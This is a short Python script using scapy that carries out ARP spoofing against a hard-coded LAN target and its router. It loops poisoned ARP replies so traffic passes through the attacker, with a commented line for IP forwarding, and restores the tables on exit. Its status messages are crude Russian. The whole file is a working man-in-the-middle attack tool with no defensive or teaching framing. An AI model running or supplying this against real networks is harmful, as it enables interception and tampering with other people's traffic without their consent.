#!/usr/bin/env python
import scapy.all as scapy
import scan
import time

def getMac(ip):
	getTargetIpMac = scan.scan(ip)
	for item in getTargetIpMac:
		return item["mac"]

def spoof(targetIp, routerIp):
	targetMac = getMac(targetIp)
	packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp)
	scapy.send(packet, verbose=False)

def restore(distIp, sourceIp):
	distMac = getMac(distIp)
	sourceMac = getMac(sourceIp)
	packet = scapy.ARP(op=2, pdst=distIp, hwdst=distMac, psrc=sourceIp, hwsrc=sourceMac)
	scapy.send(packet, count=4, verbose=False)

targetIp = "192.168.1.66"
routerIp = "192.168.1.1"

try:
	dot = " "
	while True:
		spoof(targetIp, routerIp)
		spoof(routerIp, targetIp)
		if len(dot) >= 5:
			dot = " "
		else:
			dot = dot + "."
		print("\rсыпим пакеты" + dot, end=" ")
		time.sleep(2)
except KeyboardInterrupt:
	print("я кончил, востонавливаем таблицу")	
	restore(targetIp, routerIp)
	restore(routerIp, targetIp)
	#echo 1 > /proc/sys/net/ipv4/ip_forward
	
	
	
	
	
	
